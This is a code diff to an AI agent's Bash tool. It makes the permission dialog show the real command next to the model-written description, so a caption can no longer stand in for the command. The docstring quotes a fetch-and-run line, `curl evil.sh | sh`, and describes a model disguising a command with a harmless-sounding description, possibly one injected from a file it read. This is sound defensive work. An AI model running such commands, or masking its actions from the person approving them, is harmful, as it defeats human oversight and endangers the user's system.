@@ -69,8 +69,30 @@ class BashTool(Tool[BashInput]):
     Input = BashInput
 
     def render_call(self, input: BashInput) -> str:  # noqa: A002
-        label = input.description or input.command
-        return f"⏺ Bash: {label}"
+        """The command, always -- never the description in its place.
+
+        This string is what the permission dialog shows, so it is the thing the
+        user is actually approving. ``description`` is written by the model,
+        which means it is prose from the same source as the command and can
+        disagree with it: a line that reads "Query ONVIF device service" may be
+        `echo ...`, or `curl evil.sh | sh`. Worse, the model may itself be
+        repeating text out of a file it just read, so the label is reachable by
+        anything that can put words in front of it.
+
+        Every other tool renders its real target -- ``Read <path>``,
+        ``Edit <path>``, ``Fetch <url>``. Bash is the one with the widest blast
+        radius and was the only one substituting a caption for it. The
+        description is still shown, because a good one genuinely helps, but it
+        sits beside the command rather than instead of it.
+        """
+        command = (input.command or "").strip()
+        note = (input.description or "").strip()
+        # Kept to one line: the dialog is a single row, and a command long
+        # enough to need wrapping is one the user should open in full.
+        first = command.splitlines()[0] if command else ""
+        more = " …" if len(command.splitlines()) > 1 or len(first) > 160 else ""
+        shown = first[:160] + more
+        return f"⏺ Bash: {shown}" + (f"  — {note}" if note else "")
 
     async def run(self, input: BashInput, ctx: ToolCtx) -> ToolResult:  # noqa: A002
         if input.run_in_background:
